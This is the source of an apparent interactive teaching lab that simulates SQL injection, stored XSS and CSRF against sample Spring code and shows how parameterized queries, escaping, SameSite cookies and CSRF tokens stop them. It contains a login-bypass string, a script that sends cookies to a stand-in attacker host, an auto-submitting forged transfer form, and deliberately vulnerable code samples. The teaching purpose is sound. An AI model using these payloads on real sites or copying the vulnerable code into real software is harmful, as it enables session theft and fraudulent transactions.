Lab.register({
  id: 'webattack', nav: 'Three web attacks', cat: 'Authentication', mode: 'step',
  title: 'What happens when you trust input as it is',
  intro: 'SQL injection, cross-site scripting (XSS), and cross-site request forgery (CSRF) work on different principles. In one, the input becomes part of the SQL. In another, the input runs as a script in another user\'s browser. In the third, a logged-in user\'s browser is made to send a request on the attacker\'s behalf. For each attack, turn the defenses on and off and see what changes.',
  terms: ['SQL injection', 'Cross-site scripting (XSS)', 'Cross-site request forgery (CSRF)', 'HttpOnly, Secure, and SameSite', 'Cookie'], ranks: ['websec', 'auth'],
  controls: [
    { id: 'atk', label: 'Attack type', type: 'select', value: 'sqli', options: [['sqli', 'SQL injection'], ['xss', 'XSS (stored)'], ['csrf', 'CSRF']] },
    { id: 'd1', label: 'Defense', type: 'select', value: 'none', options: [['none', 'None (build the SQL by concatenating strings)'], ['bind', 'Parameterized query with bind variables (PreparedStatement)']], show: function (c) { return c.atk === 'sqli'; } },
    { id: 'd2', label: 'Defense', type: 'select', value: 'none', options: [['none', 'None (print the input to the page as is)'], ['escape', 'Escape on output'], ['httponly', 'Only HttpOnly on the session cookie']], show: function (c) { return c.atk === 'xss'; } },
    { id: 'd3', label: 'Defense', type: 'select', value: 'none', options: [['none', 'None (the session cookie is SameSite=None)'], ['samesite', 'SameSite=Lax on the session cookie'], ['token', 'CSRF token verification']], show: function (c) { return c.atk === 'csrf'; } },
  ],
  presets: [
    { t: 'Default settings', d: 'SQL injection, no defense. The attacker is logged in without a password.', v: { atk: 'sqli', d1: 'none', d2: 'none', d3: 'none' } },
    { t: 'Parameterized query', d: 'The input is treated only as a value, not as SQL syntax.', v: { atk: 'sqli', d1: 'bind', d2: 'none', d3: 'none' } },
    { t: 'XSS, no defense', d: 'A script put in a comment runs in another user\'s browser.', v: { atk: 'xss', d1: 'none', d2: 'none', d3: 'none' } },
    { t: 'XSS, escape on output', d: 'The script is shown only as text.', v: { atk: 'xss', d1: 'none', d2: 'escape', d3: 'none' } },
    { t: 'XSS, HttpOnly only', d: 'The cookie cannot be stolen, but the script still runs.', v: { atk: 'xss', d1: 'none', d2: 'httponly', d3: 'none' } },
    { t: 'CSRF, no defense', d: 'You only opened another site, but a request goes out under your account.', v: { atk: 'csrf', d1: 'none', d2: 'none', d3: 'none' } },
    { t: 'CSRF, SameSite=Lax', d: 'The cookie is not attached to a POST sent from another site.', v: { atk: 'csrf', d1: 'none', d2: 'none', d3: 'samesite' } },
  ],
  code: function (c) {
    if (c.atk === 'sqli') return c.d1 === 'none' ? '// The input is concatenated into a string\nString sql = "SELECT * FROM member WHERE email = \'" + email\n           + "\' AND password = \'" + password + "\'";\nResultSet rs = statement.executeQuery(sql);' : '// Use placeholders (?) and pass the values separately\nString sql = "SELECT * FROM member WHERE email = ? AND password = ?";\nPreparedStatement ps = connection.prepareStatement(sql);\nps.setString(1, email);\nps.setString(2, password);\nResultSet rs = ps.executeQuery();\n\n// JPA, and #{} in MyBatis, work this way internally too';
    if (c.atk === 'xss') return c.d2 === 'escape' ? '<!-- Thymeleaf: th:text escapes automatically -->\n<p th:text="${comment.content}"></p>\n\n<!-- < is output as &lt; and > as &gt; -->' : '<!-- The input is output as HTML as is -->\n<p th:utext="${comment.content}"></p>' + (c.d2 === 'httponly' ? '\n\n# Session cookie setting\nserver.servlet.session.cookie.http-only=true' : '');
    return c.d3 === 'token' ? '<!-- The server puts an unpredictable token in every form -->\n<form method="post" action="/transfer">\n    <input type="hidden" name="_csrf" value="9f2c...">\n    ...\n</form>\n\n// Spring Security verifies the CSRF token by default\n// If the token is missing or wrong: 403' : '@PostMapping("/transfer")\nvoid transfer(@RequestParam String to, @RequestParam long amount) {\n    // identify the logged-in user by the session cookie and make the transfer\n}' + (c.d3 === 'samesite' ? '\n\n# Session cookie setting\nserver.servlet.session.cookie.same-site=lax' : '\n\n// No CSRF verification: http.csrf(csrf -> csrf.disable())\n\n# Session cookie setting\nserver.servlet.session.cookie.same-site=none');
  },
  label: function (c) { return { sqli: 'SQL injection · ' + (c.d1 === 'none' ? 'No defense' : 'Parameterized query'), xss: 'XSS · ' + { none: 'No defense', escape: 'Escaping', httponly: 'HttpOnly only' }[c.d2], csrf: 'CSRF · ' + { none: 'No defense', samesite: 'SameSite=Lax', token: 'CSRF token' }[c.d3] }[c.atk]; },
  columns: ['Attack result', 'Harm', 'Where it was stopped'],
  simulate: function (c) {
    var ev = [], sum = [], box = [], res, harm, where = '-';
    function push(s, k) { ev.push({ s: s, k: k, snap: { box: box.slice() } }); }
    if (c.atk === 'sqli') {
      box.push(['Values the attacker put in the login form', "Email: admin@shop.example\nPassword: ' OR '1'='1"]);
      push("The attacker types ' OR '1'='1 in the password field. The intent is to close the string early with the single quote and attach a SQL condition after it.", '');
      if (c.d1 === 'none') {
        box.push(['SQL the server built', "SELECT * FROM member\n WHERE email = 'admin@shop.example'\n   AND password = '' OR '1'='1'"]);
        push("The server concatenated the input into the SQL string as is. The single quote in the input closed the string in the SQL, and the OR '1'='1' after it became part of the SQL syntax.", 'bad');
        box.push(['Result in the database', "The condition is always true → member rows are returned\n→ login succeeds without knowing the password"]);
        push("'1'='1' is always true, so the whole WHERE condition becomes true. A member row is returned, and the server decides that the login succeeded.", 'bad');
        res = 'Succeeded'; harm = 'Logged in without a password (data can also be read or deleted)';
        sum.push('The cause is that the input was interpreted as "SQL syntax", not as a "value". In the same way, SQL that reads other tables or deletes data can be slipped in.');
      } else {
        box.push(['What the server sent to the database', "SQL template: SELECT * FROM member WHERE email = ? AND password = ?\nValue 1: admin@shop.example\nValue 2: ' OR '1'='1"]);
        push('The server sends the SQL template and the values separately. The database first parses the template and fixes the structure, then puts the values into the placeholders. Whatever a value contains, it is not interpreted as SQL syntax.', 'good');
        box.push(['Result in the database', "Looks for a row whose password column equals the string ' OR '1'='1\n→ 0 rows → login fails"]);
        push("The database looks for a member whose password is, letter for letter, ' OR '1'='1. There is no such member, so the login fails.", 'good');
        res = 'Failed'; harm = 'None'; where = 'Parameterized query';
        sum.push('A parameterized query separates the structure of the SQL from the values. It is a more fundamental solution than responses such as checking the input or stripping out quotes. In MyBatis, ${} inserts the string as is and causes the same problem, so you must use #{}.');
      }
    }
    if (c.atk === 'xss') {
      box.push(['Comment left by the attacker', "<script>\n  fetch('https://attacker.example/c?v=' + document.cookie)\n</script>"]);
      push('The attacker writes a script tag in a comment on a bulletin board. The server stores it in the database as the content of the comment.', '');
      if (c.d2 === 'escape') {
        box.push(['HTML the victim\'s browser received', "<p>&lt;script&gt; fetch(...) &lt;/script&gt;</p>"]);
        push('Another user opens that post. When the server output the comment, it replaced < and > with &lt; and &gt;. The browser shows this as text, not as a tag.', 'good');
        box.push(['What happened in the victim\'s browser', 'The script did not run. The code is only shown as text on the screen']);
        push('The script does not run.', 'good'); res = 'Failed'; harm = 'None'; where = 'Output escaping';
        sum.push('The basic defense is to convert what a user entered when you send it to the screen, so that it is not interpreted as HTML (escaping). Template engines and front-end frameworks escape by default, so be careful when you use an output method that turns that feature off (th:utext, innerHTML, and so on).');
      } else {
        box.push(['HTML the victim\'s browser received', "<p><script> fetch('https://attacker.example/c?v=' + document.cookie) </script></p>"]);
        push('Another user opens that post. The server put the comment into the HTML as is. The browser cannot tell whether it is a comment or a script placed by the site, and runs it.', 'bad');
        if (c.d2 === 'none') { box.push(['What happened in the victim\'s browser', 'The script runs → the session ID in document.cookie is sent to the attacker\'s server']); push('The script reads the victim\'s session cookie and sends it to the attacker\'s server. With that session ID, the attacker can now pose as the logged-in victim.', 'bad'); res = 'Succeeded'; harm = 'Session theft (account takeover)'; sum.push('XSS is an attack in which the attacker\'s script runs in the victim\'s browser with the privileges of that site.'); }
        else { box.push(['What happened in the victim\'s browser', 'The script runs → the session cookie does not appear in document.cookie (HttpOnly)\nBut the script can do anything on this page']); push('An HttpOnly cookie cannot be read by a script, so the session ID does not leak. But the script itself ran, so it can send requests on the spot, such as writing a post in the victim\'s name or changing the screen.', 'bad'); res = 'Partly succeeded'; harm = 'The cookie was protected, but requests can be made with the victim\'s privileges'; where = 'HttpOnly (blocks only reading the cookie)'; sum.push('HttpOnly only limits the damage. It does not stop XSS itself. Use it together with output escaping.'); }
      }
    }
    if (c.atk === 'csrf') {
      box.push(['Victim\'s state', 'Logged in to bank.example (session cookie in the browser' + (c.d3 === 'none' ? ', SameSite=None' : c.d3 === 'samesite' ? ', SameSite=Lax' : '') + ')']);
      push('The victim, still logged in to the bank site, opens a site made by the attacker in another tab.', '');
      box.push(['Form hidden on the attacker\'s site', '<form action="https://bank.example/transfer" method="post">\n  <input name="to" value="attacker account">\n  <input name="amount" value="1000000">\n</form>\n<script>document.forms[0].submit()</script>']);
      push('That page hides a form that posts to the transfer URL of the bank, and it is submitted automatically as soon as the page opens. The one that sends the request is not the attacker but the victim\'s browser.', '');
      if (c.d3 === 'samesite') { box.push(['Request bank.example received', 'POST /transfer\n(no session cookie)\n→ handled as a request that is not logged in → rejected']); push('The session cookie has SameSite=Lax. The browser does not attach this cookie to a POST request that starts from another site. The bank server sees a request that is not logged in and rejects it.', 'good'); res = 'Failed'; harm = 'None'; where = 'SameSite cookie'; sum.push('SameSite=Lax keeps the cookie off a POST sent from another site. Today\'s browsers treat a cookie without SameSite like Lax too (as an exception, the cookie is attached for about 2 minutes right after it is issued), but it is safer to state it explicitly. When SameSite=None is truly needed, such as for a service embedded in a page of another domain, a CSRF token is essential.'); }
      else if (c.d3 === 'token') { box.push(['Request bank.example received', 'POST /transfer\nCookie: session ID (attached automatically)\n_csrf token: none\n→ 403 rejected']); push('The browser attached the session cookie, but the bank server also requires the CSRF token it put in the form. The attacker cannot know the value of that token, so could not put it in the request. The server rejects the request with 403.', 'good'); res = 'Failed'; harm = 'None'; where = 'CSRF token verification'; sum.push('A CSRF token checks whether this request started from a page of our own site. It relies on the fact that the browser attaches cookies automatically but does not attach the token.'); }
      else { box.push(['Request bank.example received', 'POST /transfer\nCookie: session ID (attached automatically by the browser)\nto=attacker account, amount=1000000\n→ judged a normal request → transfer executed']); push('This session cookie is set to be attached even to requests sent from other sites (SameSite=None). The browser automatically attaches the session cookie to a request going to bank.example. To the bank server, it cannot be told apart from a normal transfer request sent by the logged-in user. The transfer is executed.', 'bad'); res = 'Succeeded'; harm = 'Transfer executed from the victim\'s account'; sum.push('CSRF abuses the fact that cookies are attached to requests automatically. Without stealing the cookie value, the attacker makes the victim\'s browser send the request on their behalf.'); }
      if (c.d3 !== 'none') sum.push('An API that sends authentication information in the Authorization header (such as a JWT) instead of in a cookie is hard to target with CSRF, because the browser does not attach the header automatically. That is why CSRF protection is sometimes turned off on such API servers.');
    }
    sum.unshift('Attack result: ' + res + '. Harm: ' + harm + '.');
    return { events: ev, summary: sum, row: [res, harm, where] };
  },
  render: function (v, sim, t, H, shown) {
    var last = shown[shown.length - 1], box = last ? last.snap.box : [];
    if (!box.length) { H.text(v, 'Click Run to see the attack step by step.'); return; }
    box.forEach(function (b, i) { H.title(v, b[0]); var p = H.el('pre', 'code', b[1]); if (i === box.length - 1) p.style.borderColor = 'var(--busy-edge)'; v.appendChild(p); });
  },
  // Diagram: three boxes from top to bottom show what the attacker's input turns into as it passes through the server.
  draw: function (P, sim, shown) {
    var last = shown[shown.length - 1], box = last ? last.snap.box : [], n = box.length, k = last ? last.k : '';
    P.size(680, 404);
    for (var i = 0; i < 3; i++) {
      var b = box[i], lines = b ? b[1].split('\n').slice(0, 4) : [' '];
      P.box('bx' + i, 16, 16 + i * 112, 648, 98, { cls: !b ? 'ghost' : i === n - 1 ? (k === 'bad' ? 'bad' : k === 'good' ? 'good' : 'hot') : 'plain', title: b ? b[0] : ['Value the attacker puts in', 'What the server makes of it', 'Result'][i], sub: lines, mono: !!b });
      if (i && b) P.arrow('ar' + i, 'bx' + (i - 1) + ':b:0.08', 'bx' + i + ':t:0.08');
    }
    P.box('res', 16, 352, 648, 36, { cls: n < 3 ? 'ghost' : k === 'bad' ? 'bad' : 'good', title: 'Attack result', right: n < 3 ? 'In progress' : k === 'bad' ? 'Attack succeeded' : 'Blocked' });
    P.note('It proceeds from top to bottom. What happens to the value the attacker put in, at the middle step, decides the result at the bottom. Long lines look cut off, so check the full content in the screen on the right.');
  },
  assume: 'All three attacks are textbook examples to show the principle, and they follow the explanations of OWASP and the defenses in the Spring Security documentation. The login code that compares the password directly in SQL is there to explain SQL injection. In practice, passwords are stored as hashes and verified in the application. The comparison covers states with only one defense turned on, but in practice several defenses are layered. For all three attacks, part of the behavior was checked by actually running it. For SQL injection, on a real SQL engine (SQLite), string concatenation returned 1 row and the query with bind variables returned 0 rows. For XSS, in a real browser (Chromium-based), the script in the comment that was printed as is ran and read the cookie, it did not run when the output was escaped, and an HttpOnly cookie was not visible even when the script ran. For CSRF, on a POST submitted automatically from another site, a SameSite=None cookie was attached and a SameSite=Lax cookie was not. A cookie with no SameSite specified was attached right after it was issued, but was not attached after about 2 minutes. CSRF token verification is server-side logic, so it was not run separately.',
});
